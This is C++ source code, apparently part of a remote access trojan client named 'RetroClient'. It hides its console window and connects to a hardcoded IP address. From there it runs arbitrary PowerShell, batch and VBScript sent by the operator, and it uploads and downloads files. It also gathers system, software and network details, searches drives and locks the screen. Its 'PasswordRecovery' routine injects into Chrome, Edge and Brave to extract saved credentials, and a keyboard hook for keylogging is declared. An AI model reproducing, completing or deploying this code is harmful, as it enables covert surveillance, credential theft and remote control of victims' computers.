                throw std::runtime_error("File is empty or cannot determine size");
            }

            // Get filename for response
            std::string filename = fs::path(path).filename().string();

            // Send file info first
            std::string info_msg = "{\"type\":\"fm_download_start\",\"filename\":\"" +
                escapeJsonString(filename) + "\",\"size\":" + std::to_string(file_size) + "}\n";
            sendMessage(info_msg);

            std::cout << "[DOWNLOAD] Starting download of " << filename << " (" << file_size << " bytes)" << std::endl;

            // Read entire file into memory first, then send as base64 chunks
            std::vector<unsigned char> file_data(file_size);
            file.read(reinterpret_cast<char*>(file_data.data()), file_size);
            file.close();

            // Encode entire file to base64
            std::string full_base64 = base64_encode(file_data);

            // Now send base64 in chunks (without padding until the end)
            const size_t base64_chunk_size = 43692; // This ensures clean base64 chunks
            int total_chunks = (int)((full_base64.length() + base64_chunk_size - 1) / base64_chunk_size);
            int chunk_index = 0;

            std::cout << "[DOWNLOAD] Full base64 size: " << full_base64.length() << " chars, sending in " << total_chunks << " chunks" << std::endl;

            for (size_t pos = 0; pos < full_base64.length(); pos += base64_chunk_size) {
                size_t remaining = full_base64.length() - pos;
                size_t chunk_len = (remaining < base64_chunk_size) ? remaining : base64_chunk_size;
                std::string chunk = full_base64.substr(pos, chunk_len);

                // Remove any padding from intermediate chunks
                if (chunk_index < total_chunks - 1) {
                    // Remove padding from non-final chunks
                    while (!chunk.empty() && chunk.back() == '=') {
                        chunk.pop_back();
                    }
                }

                bool is_last = (chunk_index == total_chunks - 1);

                // Create JSON message
                std::ostringstream chunk_msg;
                chunk_msg << "{\"type\":\"fm_download_chunk\","
                    << "\"chunk_index\":" << chunk_index << ","
                    << "\"total_chunks\":" << total_chunks << ","
                    << "\"chunk_data\":\"" << chunk << "\","
                    << "\"is_last\":" << (is_last ? "true" : "false") << "}\n";

                sendMessage(chunk_msg.str());

                chunk_index++;

                // Progress logging
                if (chunk_index % 20 == 0) {
                    std::cout << "[DOWNLOAD] Progress: " << chunk_index << "/" << total_chunks
                        << " (chunk size: " << chunk.length() << " chars)" << std::endl;
                }

                // Small delay to prevent overwhelming
                std::this_thread::sleep_for(std::chrono::milliseconds(15));
            }

            std::cout << "[DOWNLOAD] Completed download of " << filename << " (" << chunk_index << " chunks sent)" << std::endl;

            // Send completion
            std::string complete_msg = "{\"type\":\"fm_download_complete\",\"success\":true}\n";
            sendMessage(complete_msg);

        }
        catch (const std::exception& e) {
            std::cout << "[DOWNLOAD] Error: " << e.what() << std::endl;
            std::string error_msg = "{\"type\":\"fm_download_complete\",\"success\":false,"
                "\"error\":\"" + escapeJsonString(e.what()) + "\"}\n";
            sendMessage(error_msg);
        }
    }

    void handleFmUploadStart(const std::string& message) {
        // Extract path, filename and total chunks
        size_t path_start = message.find("\"path\":\"");
        size_t filename_start = message.find("\"filename\":\"");
        size_t chunks_start = message.find("\"total_chunks\":");

        if (path_start != std::string::npos && filename_start != std::string::npos && chunks_start != std::string::npos) {
            path_start += 8;
            size_t path_end = message.find("\"", path_start);
            fm_upload_path = message.substr(path_start, path_end - path_start);

            // Unescape the path
            fm_upload_path = unescapeJsonString(fm_upload_path);

            filename_start += 12;
            size_t filename_end = message.find("\"", filename_start);
            fm_upload_filename = message.substr(filename_start, filename_end - filename_start);

            chunks_start += 15;
            size_t chunks_end = message.find_first_of(",}", chunks_start);
            fm_expected_chunks = std::stoi(message.substr(chunks_start, chunks_end - chunks_start));
            fm_received_chunks = 0;

            // Ensure path ends with separator
            if (!fm_upload_path.empty() && fm_upload_path.back() != '\\' && fm_upload_path.back() != '/') {
                fm_upload_path += "\\";
            }

            std::string filepath = fm_upload_path + fm_upload_filename;

            // Close any existing file
            if (fm_upload_file.is_open()) {
                fm_upload_file.close();
            }

            fm_upload_file.open(filepath, std::ios::binary);

            std::cout << "[FILE MANAGER] Starting upload: " << filepath << std::endl;
        }
    }

    void handleFmUploadChunk(const std::string& message) {
        // Extract chunk data
        size_t chunk_data_start = message.find("\"chunk_data\":\"");
        size_t is_last_start = message.find("\"is_last\":");

        if (chunk_data_start != std::string::npos && fm_upload_file.is_open()) {
            chunk_data_start += 14;
            size_t chunk_data_end = message.find("\"", chunk_data_start);
            std::string chunk_base64 = message.substr(chunk_data_start, chunk_data_end - chunk_data_start);

            // Decode base64 chunk
            std::vector<unsigned char> decoded = base64_decode(chunk_base64);
            fm_upload_file.write((char*)decoded.data(), decoded.size());
            fm_upload_file.flush(); // Ensure data is written

            fm_received_chunks++;

            // Check if last chunk
            bool is_last = false;
            if (is_last_start != std::string::npos) {
                is_last_start += 10;
                is_last = message.substr(is_last_start, 4) == "true";
            }

            if (is_last || fm_received_chunks >= fm_expected_chunks) {
                fm_upload_file.close();
                std::cout << "[FILE MANAGER] Upload complete: " << fm_upload_filename << std::endl;

                // Send completion message
                std::string response = "{\"type\":\"fm_operation_result\",\"operation\":\"upload\","
                    "\"success\":true,\"message\":\"File uploaded successfully\"}\n";
                sendMessage(response);
            }
        }
    }

    // Helper functions for JSON string handling
    std::string escapeJsonString(const std::string& input) {
        std::string output;
        output.reserve(input.length() * 2);

        for (char c : input) {
            switch (c) {
            case '"': output += "\\\""; break;
            case '\\': output += "\\\\"; break;
            case '\b': output += "\\b"; break;
            case '\f': output += "\\f"; break;
            case '\n': output += "\\n"; break;
            case '\r': output += "\\r"; break;
            case '\t': output += "\\t"; break;
            default:
                if (c >= 0 && c < 0x20) {
                    output += "\\u";
                    output += "0000";
                    output[output.length() - 2] = "0123456789abcdef"[c >> 4];
                    output[output.length() - 1] = "0123456789abcdef"[c & 0xf];
                }
                else {
                    output += c;
                }
                break;
            }
        }
        return output;
    }

    std::string unescapeJsonString(const std::string& input) {
        std::string output;
        output.reserve(input.length());

        for (size_t i = 0; i < input.length(); ++i) {
            if (input[i] == '\\' && i + 1 < input.length()) {
                switch (input[i + 1]) {
                case '"': output += '"'; i++; break;
                case '\\': output += '\\'; i++; break;
                case '/': output += '/'; i++; break;
                case 'b': output += '\b'; i++; break;
                case 'f': output += '\f'; i++; break;
                case 'n': output += '\n'; i++; break;
                case 'r': output += '\r'; i++; break;
                case 't': output += '\t'; i++; break;
                default: output += input[i]; break;
                }
            }
            else {
                output += input[i];
            }
        }
        return output;
    }

    std::string getJsonValue(const std::string& json, const std::string& key) {
        std::string search_key = "\"" + key + "\":\"";
        size_t start = json.find(search_key);
        if (start == std::string::npos) {
            return "";
        }
        start += search_key.length();
        size_t end = json.find("\"", start);
        if (end == std::string::npos) {
            return "";
        }
        return unescapeJsonString(json.substr(start, end - start));
    }

    void sendTrollResponse(const std::string& trollType, bool success, const std::string& errorMsg = "") {
        std::string response = "{\"type\":\"troll_response\",";
        response += "\"troll_type\":\"" + trollType + "\",";
        response += "\"success\":" + std::string(success ? "true" : "false");
        if (!success) {
            response += ",\"error\":\"" + escapeJsonString(errorMsg) + "\"";
        }
        response += "}\n";
        sendMessage(response);
    }

    void handleMessageBox(const std::string& message) {
#ifdef _WIN32
        std::string title = getJsonValue(message, "title");
        std::string text = getJsonValue(message, "text");

        // Convert to wide strings for WinAPI
        std::wstring wtitle(title.begin(), title.end());
        std::wstring wtext(text.begin(), text.end());

        int result = MessageBoxW(NULL, wtext.c_str(), wtitle.c_str(), MB_OK | MB_ICONINFORMATION);
        if (result != 0) {
            sendTrollResponse("messagebox", true);
        }
        else {
            sendTrollResponse("messagebox", false, "MessageBoxW failed.");
        }
#else
        sendTrollResponse("messagebox", false, "Not supported on this OS.");
#endif
    }

    void handleOpenURL(const std::string& message) {
#ifdef _WIN32
        std::string url = getJsonValue(message, "url");
        std::wstring wurl(url.begin(), url.end());

        HINSTANCE result = ShellExecuteW(NULL, L"open", wurl.c_str(), NULL, NULL, SW_SHOWNORMAL);
        if ((intptr_t)result > 32) {
            sendTrollResponse("open_url", true);
        }
        else {
            sendTrollResponse("open_url", false, "ShellExecuteW failed.");
        }
#else
        sendTrollResponse("open_url", false, "Not supported on this OS.");
#endif
    }

    void handleTTS(const std::string& message) {
#ifdef _WIN32
        std::string text = getJsonValue(message, "text");
        if (text.empty()) {
            sendTrollResponse("tts", false, "Text is empty.");
            return;
        }

        if (FAILED(CoInitialize(NULL))) {
            sendTrollResponse("tts", false, "CoInitialize failed.");
            return;
        }

        CComPtr<ISpVoice> pVoice;
        HRESULT hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void**)&pVoice);

        if (SUCCEEDED(hr)) {
            std::wstring wtext(text.begin(), text.end());
            hr = pVoice->Speak(wtext.c_str(), 0, NULL);
            if (SUCCEEDED(hr)) {
                sendTrollResponse("tts", true);
            }
            else {
                sendTrollResponse("tts", false, "ISpVoice::Speak failed.");
            }
        }
        else {
            sendTrollResponse("tts", false, "CoCreateInstance for ISpVoice failed.");
        }

        CoUninitialize();
#else
        sendTrollResponse("tts", false, "Not supported on this OS.");
#endif
    }

    void handleGetSysInfo() {
        std::string response = "{\"type\":\"sysinfo_response\",\"info\":{";

        // General Info
        response += "\"hostname\":\"" + escapeJsonString(hostname) + "\",";
        response += "\"os\":\"" + escapeJsonString(os_info) + "\",";
#ifdef _WIN32
        char username[UNLEN + 1];
        DWORD username_len = UNLEN + 1;
        GetUserNameA(username, &username_len);
        response += "\"username\":\"" + escapeJsonString(std::string(username)) + "\",";

        DWORD uptimeMillis = GetTickCount();
        int days = uptimeMillis / (1000 * 60 * 60 * 24);
        int hours = (uptimeMillis / (1000 * 60 * 60)) % 24;
        int minutes = (uptimeMillis / (1000 * 60)) % 60;
        std::string uptimeStr = std::to_string(days) + "d " + std::to_string(hours) + "h " + std::to_string(minutes) + "m";
        response += "\"uptime\":\"" + escapeJsonString(uptimeStr) + "\",";
#else
        // Linux general info could be added here
        response += "\"username\":\"N/A\",";
        response += "\"uptime\":\"N/A\",";
#endif

        // Hardware Info
#ifdef _WIN32
        char cpuBrand[0x40] = { 0 };
        int cpuInfo[4] = { -1 };
        __cpuid(cpuInfo, 0x80000000);
        unsigned int nExIds = cpuInfo[0];
        for (unsigned int i = 0x80000000; i <= nExIds; ++i) {
            __cpuid(cpuInfo, i);
            if (i == 0x80000002)
                memcpy(cpuBrand, cpuInfo, sizeof(cpuInfo));
            else if (i == 0x80000003)
                memcpy(cpuBrand + 16, cpuInfo, sizeof(cpuInfo));
            else if (i == 0x80000004)
                memcpy(cpuBrand + 32, cpuInfo, sizeof(cpuInfo));
        }
        response += "\"cpu\":\"" + escapeJsonString(std::string(cpuBrand)) + "\",";

        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        response += "\"cores\":" + std::to_string(sysInfo.dwNumberOfProcessors) + ",";

        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        GlobalMemoryStatusEx(&memInfo);
        response += "\"ram\":\"" + std::to_string(memInfo.ullTotalPhys / (1024 * 1024)) + " MB\",";

        response += "\"drives\":[";
        char driveLetters[256];
        GetLogicalDriveStringsA(sizeof(driveLetters), driveLetters);
        bool firstDrive = true;
        for (char* drive = driveLetters; *drive; drive += 4) {
            ULARGE_INTEGER totalNumberOfBytes;
            if (GetDiskFreeSpaceExA(drive, NULL, &totalNumberOfBytes, NULL)) {
                if (!firstDrive) response += ",";
                std::string driveStr = std::string(drive) + " " + std::to_string(totalNumberOfBytes.QuadPart / (1024 * 1024 * 1024)) + " GB";
                response += "\"" + escapeJsonString(driveStr) + "\"";
                firstDrive = false;
            }
        }
        response += "],";

#else
    // Linux hardware info
    // ... existing code ...
        if (GetAdaptersAddresses(AF_UNSPEC, 0, NULL, pAddresses, &bufferSize) == NO_ERROR) {
            bool firstAdapter = true;
            for (; pAddresses; pAddresses = pAddresses->Next) {
                if (!firstAdapter) response += ",";
                std::wstring ws(pAddresses->FriendlyName);
                std::string friendlyName(ws.begin(), ws.end());
                response += "{\"name\":\"" + escapeJsonString(friendlyName) + "\",";

                char macStr[18];
                sprintf_s(macStr, "%.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
                    pAddresses->PhysicalAddress[0], pAddresses->PhysicalAddress[1], pAddresses->PhysicalAddress[2],
                    pAddresses->PhysicalAddress[3], pAddresses->PhysicalAddress[4], pAddresses->PhysicalAddress[5]);
                response += "\"mac\":\"" + std::string(macStr) + "\",";

                response += "\"ips\":[";
                bool firstIp = true;
                for (PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pAddresses->FirstUnicastAddress; pUnicast; pUnicast = pUnicast->Next) {
                    char ipStr[INET6_ADDRSTRLEN];
                    void* pAddr = pUnicast->Address.lpSockaddr->sa_family == AF_INET ?
                        (void*)&((struct sockaddr_in*)pUnicast->Address.lpSockaddr)->sin_addr :
                        (void*)&((struct sockaddr_in6*)pUnicast->Address.lpSockaddr)->sin6_addr;
                    inet_ntop(pUnicast->Address.lpSockaddr->sa_family, pAddr, ipStr, sizeof(ipStr));
                    if (!firstIp) response += ",";
                    response += "\"" + std::string(ipStr) + "\"";
                    firstIp = false;
                }
                response += "]}";
                firstAdapter = false;
            }
        }
#endif

        // Software Info
        response += "\"software\":[";
#ifdef _WIN32
        const char* keyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char subKeyName[255];
            DWORD subKeyNameSize = 255;
            int i = 0;
            bool first = true;
            while (RegEnumKeyExA(hKey, i, subKeyName, &subKeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                HKEY hSubKey;
                std::string fullSubKeyPath = std::string(keyPath) + "\\" + std::string(subKeyName);
                if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, fullSubKeyPath.c_str(), 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                    char displayName[255];
                    DWORD displayNameSize = sizeof(displayName);
                    if (RegGetValueA(hSubKey, NULL, "DisplayName", RRF_RT_REG_SZ, NULL, displayName, &displayNameSize) == ERROR_SUCCESS) {
                        if (!first) response += ",";
                        response += "{\"name\":\"" + escapeJsonString(std::string(displayName)) + "\",";
                        char displayVersion[255];
                        DWORD displayVersionSize = sizeof(displayVersion);
                        if (RegGetValueA(hSubKey, NULL, "DisplayVersion", RRF_RT_REG_SZ, NULL, displayVersion, &displayVersionSize) == ERROR_SUCCESS) {
                            response += "\"version\":\"" + escapeJsonString(std::string(displayVersion)) + "\"}";
                        }
                        else {
                            response += "\"version\":\"N/A\"}";
                        }
                        first = false;
                    }
                    RegCloseKey(hSubKey);
                }
                subKeyNameSize = 255;
                i++;
            }
            RegCloseKey(hKey);
        }
#endif
        response += "],";

        // Network Info
        response += "\"network\":[";
#ifdef _WIN32
        ULONG bufferSize = 0;
        GetAdaptersAddresses(AF_UNSPEC, 0, NULL, NULL, &bufferSize);
        std::vector<BYTE> buffer(bufferSize);
        PIP_ADAPTER_ADDRESSES pAddresses = (PIP_ADAPTER_ADDRESSES)buffer.data();
        if (GetAdaptersAddresses(AF_UNSPEC, 0, NULL, pAddresses, &bufferSize) == NO_ERROR) {
            bool firstAdapter = true;
            for (; pAddresses; pAddresses = pAddresses->Next) {
                if (!firstAdapter) response += ",";
                std::wstring ws(pAddresses->FriendlyName);
                std::string friendlyName(ws.begin(), ws.end());
                response += "{\"name\":\"" + escapeJsonString(friendlyName) + "\",";

                char macStr[18];
                sprintf_s(macStr, "%.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
                    pAddresses->PhysicalAddress[0], pAddresses->PhysicalAddress[1], pAddresses->PhysicalAddress[2],
                    pAddresses->PhysicalAddress[3], pAddresses->PhysicalAddress[4], pAddresses->PhysicalAddress[5]);
                response += "\"mac\":\"" + std::string(macStr) + "\",";

                response += "\"ips\":[";
                bool firstIp = true;
                for (PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pAddresses->FirstUnicastAddress; pUnicast; pUnicast = pUnicast->Next) {
                    char ipStr[INET6_ADDRSTRLEN];
                    void* pAddr = pUnicast->Address.lpSockaddr->sa_family == AF_INET ?
                        (void*)&((struct sockaddr_in*)pUnicast->Address.lpSockaddr)->sin_addr :
                        (void*)&((struct sockaddr_in6*)pUnicast->Address.lpSockaddr)->sin6_addr;
                    inet_ntop(pUnicast->Address.lpSockaddr->sa_family, pAddr, ipStr, sizeof(ipStr));
                    if (!firstIp) response += ",";
                    response += "\"" + std::string(ipStr) + "\"";
                    firstIp = false;
                }
                response += "]}";
                firstAdapter = false;
            }
        }
#else
        // Linux network info
#endif
        response += "]";


        response += "}}\n";
        sendMessage(response);
    }

    void handleExecuteScript(const std::string& message) {
        std::string scriptType = getJsonValue(message, "script_type");
        std::string scriptContent = getJsonValue(message, "script_content");

        if (scriptContent.empty()) {
            sendScriptResponse("Error: Script content is empty.", false, "Script content is empty.");
            return;
        }

        std::string extension;
        std::string executor;

        if (scriptType == "powershell") {
            extension = ".ps1";
            executor = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ";
        }
        else if (scriptType == "batch") {
            extension = ".bat";
            executor = ""; // The file itself is the executor
        }
        else if (scriptType == "vbscript") {
            extension = ".vbs";
            executor = "cscript.exe //Nologo ";
        }
        else {
            sendScriptResponse("Error: Unsupported script type.", false, "Unsupported script type.");
            return;
        }

#ifdef _WIN32
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        std::string scriptPath = std::string(tempPath) + "0x_script_" + std::to_string(time(0)) + extension;
#else
        std::string scriptPath = "/tmp/0x_script_" + std::to_string(time(0)) + extension;
#endif

        std::ofstream scriptFile(scriptPath);
        if (!scriptFile) {
            sendScriptResponse("Error: Could not create temporary script file.", false, "Could not create temporary script file.");
            return;
        }
        scriptFile << scriptContent;
        scriptFile.close();

        std::string command = executor + "\"" + scriptPath + "\"";
        std::string result;
        bool success = false;
        std::string error;

        try {
#ifdef _WIN32
            FILE* pipe = _popen(command.c_str(), "r");
#else
            FILE* pipe = popen(command.c_str(), "r");
#endif

            if (pipe) {
                char buffer[256];
                while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
                    result += buffer;
                }

#ifdef _WIN32
                int exit_code = _pclose(pipe);
#else
                int exit_code = pclose(pipe);
#endif
                success = (exit_code == 0);
                if (!success) {
                    error = "Script exited with code " + std::to_string(exit_code);
                }
            }
            else {
                success = false;
                error = "Failed to execute script via popen.";
            }
        }
        catch (const std::exception& e) {
            success = false;
            error = "Exception caught during script execution.";
            result = e.what();
        }

        sendScriptResponse(result, success, error);

        // Clean up the script file
        remove(scriptPath.c_str());
    }

    void handleFmSearch(const std::string& message) {
        std::string path = getJsonValue(message, "path");
        std::string pattern = getJsonValue(message, "pattern");

        if (fm_search_active) {
            return; // Search already in progress
        }

        fm_search_active = true;
        fm_search_thread = std::thread([this, path, pattern]() {
            try {
                fs::recursive_directory_iterator it(path, fs::directory_options::skip_permission_denied);
                for (const auto& entry : it) {
                    if (!fm_search_active) break; // Check if search was stopped

                    if (entry.is_regular_file()) {
                        std::wstring wpattern(pattern.begin(), pattern.end());
                        std::wstring wfilename = entry.path().filename().native();

                        if (PathMatchSpecW(wfilename.c_str(), wpattern.c_str())) {
                            std::string found_path = entry.path().string();
                            std::replace(found_path.begin(), found_path.end(), '\\', '/');

                            std::string file_info = "{";
                            file_info += "\"name\":\"" + escapeJsonString(entry.path().filename().string()) + "\",";
                            file_info += "\"path\":\"" + escapeJsonString(found_path) + "\",";
                            file_info += "\"type\":\"file\",";
                            file_info += "\"size\":" + std::to_string(entry.file_size()) + ",";
                            file_info += "\"modified\":\"\"";
                            file_info += "}";

                            sendMessage("{\"type\":\"fm_search_result\",\"file\":" + file_info + "}\n");
                            std::this_thread::sleep_for(std::chrono::milliseconds(10)); // Prevent flooding
                        }
                    }
                }
            }
            catch (const std::exception& e) {
                // Ignore errors like permission denied
            }
            sendMessage("{\"type\":\"fm_search_complete\",\"message\":\"Search finished.\"}\n");
            fm_search_active = false;
            });
    }

    void handleFmStopSearch() {
        if (fm_search_active) {
            fm_search_active = false;
            if (fm_search_thread.joinable()) {
                fm_search_thread.join();
            }
        }
    }


    void handleLockScreen(const std::string& message) {
#ifdef _WIN32
        std::thread lockerThread([this, message]() {
            std::string text = getJsonValue(message, "text");
            std::wstring wtext(text.begin(), text.end());

            WNDCLASSW wc = {};
            wc.lpfnWndProc = LockWndProc;
            wc.hInstance = GetModuleHandle(NULL);
            wc.lpszClassName = L"ScreenLocker";
            wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
            RegisterClassW(&wc);

            HWND hwnd = CreateWindowExW(
                WS_EX_TOPMOST,
                L"ScreenLocker",
                L"Screen Locked",
                WS_POPUP,
                0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
                NULL, NULL, GetModuleHandle(NULL), NULL
            );

            if (hwnd) {
                HDC hdc = GetDC(hwnd);
                SetTextColor(hdc, RGB(0, 255, 0));
                SetBkMode(hdc, TRANSPARENT);
                RECT rect;
                GetClientRect(hwnd, &rect);

                ShowWindow(hwnd, SW_SHOWMAXIMIZED);
                UpdateWindow(hwnd);

                // Simple message loop
                MSG msg = {};
                while (GetMessage(&msg, NULL, 0, 0) > 0) {
                    // Draw text in the message loop to ensure it redraws
                    HDC hdc_paint = GetDC(hwnd);
                    DrawTextW(hdc_paint, wtext.c_str(), -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
                    ReleaseDC(hwnd, hdc_paint);

                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }
            }
            sendTrollResponse("lock_screen", true);
            });
        lockerThread.detach();
#else
        sendTrollResponse("lock_screen", false, "Not supported on this OS.");
#endif
    }
    void PasswordRecovery()
    {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);

        wchar_t appDataPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath))) {
            wcscat_s(appDataPath, MAX_PATH, L"\\Recovered");
        }

        {
            wchar_t* autoArgs[5];
            autoArgs[0] = exePath;
            autoArgs[1] = const_cast<wchar_t*>(L"--start-browser");
            autoArgs[2] = const_cast<wchar_t*>(L"--output-path");
            autoArgs[3] = appDataPath;
            autoArgs[4] = const_cast<wchar_t*>(L"chrome");

            int result = Injector::Run(5, autoArgs);
            if (result == 0) {
            }
        }

        {
            wchar_t* autoArgs[5];
            autoArgs[0] = exePath;
            autoArgs[1] = const_cast<wchar_t*>(L"--start-browser");
            autoArgs[2] = const_cast<wchar_t*>(L"--output-path");
            autoArgs[3] = appDataPath;
            autoArgs[4] = const_cast<wchar_t*>(L"edge");

            int result = Injector::Run(5, autoArgs);
            if (result == 0) {
            }
        }

        {
            wchar_t* autoArgs[5];
            autoArgs[0] = exePath;
            autoArgs[1] = const_cast<wchar_t*>(L"--start-browser");
            autoArgs[2] = const_cast<wchar_t*>(L"--output-path");
            autoArgs[3] = appDataPath;
            autoArgs[4] = const_cast<wchar_t*>(L"brave");

            int result = Injector::Run(5, autoArgs);
            if (result == 0) {
            }
        }
    }


    void sendCommandResponse(const std::string& output, bool success) {
        // Escape output for JSON
        std::string escaped_output;
        for (char c : output) {
            if (c == '"') {
                escaped_output += "\\\"";
            }
            else if (c == '\\') {
                escaped_output += "\\\\";
            }
            else if (c == '\n') {
                escaped_output += "\\n";
            }
            else if (c == '\r') {
                escaped_output += "\\r";
            }
            else if (c == '\t') {
                escaped_output += "\\t";
            }
            else if (c >= 32 && c <= 126) {
                escaped_output += c;
            }
        }

        std::string response = "{\"type\":\"response\",\"data\":\"" + escaped_output +
            "\",\"success\":" + (success ? "true" : "false") + "}\n";
        sendMessage(response);
    }

    void handlePasswordRecovery() {
        PasswordRecovery(); // Calling your existing function

#ifdef _WIN32
        wchar_t appDataPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath))) {
            std::wstring recoveredPathW = std::wstring(appDataPath) + L"\\Recovered";
            std::string recoveredPath(recoveredPathW.begin(), recoveredPathW.end());

            std::string response = "{\"type\":\"password_recovery_complete\",";
            response += "\"path\":\"" + escapeJsonString(recoveredPath) + "\"}";
            response += "\n";
            sendMessage(response);
        }
        else {
            sendMessage("{\"type\":\"password_recovery_complete\",\"path\":\"\"}\n");
        }
#else
        // Handle non-Windows path if necessary
        sendMessage("{\"type\":\"password_recovery_complete\",\"path\":\"\"}\n");
#endif
    }
};








#ifdef _WIN32
HHOOK RetroClient::keyboard_hook = NULL;
RetroClient* RetroClient::keylog_instance = nullptr;
#endif




int main(int argc, char* argv[]) {

    ShowWindow(GetConsoleWindow(), SW_HIDE);


    std::string host = "103.59.160.219";
    int port = 9999;

    // READ FROM RESOURCES
    HMODULE hModule = GetModuleHandle(NULL);

    // Read host from resource ID 100
    HRSRC hResHost = FindResource(hModule, MAKEINTRESOURCE(100), RT_RCDATA);
    if (hResHost) {
        HGLOBAL hMemHost = LoadResource(hModule, hResHost);
        if (hMemHost) {
            DWORD sizeHost = SizeofResource(hModule, hResHost);
            char* dataHost = (char*)LockResource(hMemHost);
            if (dataHost && sizeHost > 0) {
                host = std::string(dataHost, sizeHost);
            }
        }
    }

    // Read port from resource ID 101
    HRSRC hResPort = FindResource(hModule, MAKEINTRESOURCE(101), RT_RCDATA);
    if (hResPort) {
        HGLOBAL hMemPort = LoadResource(hModule, hResPort);
        if (hMemPort) {
            DWORD sizePort = SizeofResource(hModule, hResPort);
            int* dataPort = (int*)LockResource(hMemPort);
            if (dataPort && sizePort == sizeof(int)) {
                port = *dataPort;
            }
        }
    }


    try {
        RetroClient client(host, port);
        std::cout << "[CLIENT] Press Ctrl+C to exit..." << std::endl;
        client.run();
    }
    catch (const std::exception& e) {
        std::cerr << "[FATAL ERROR] " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
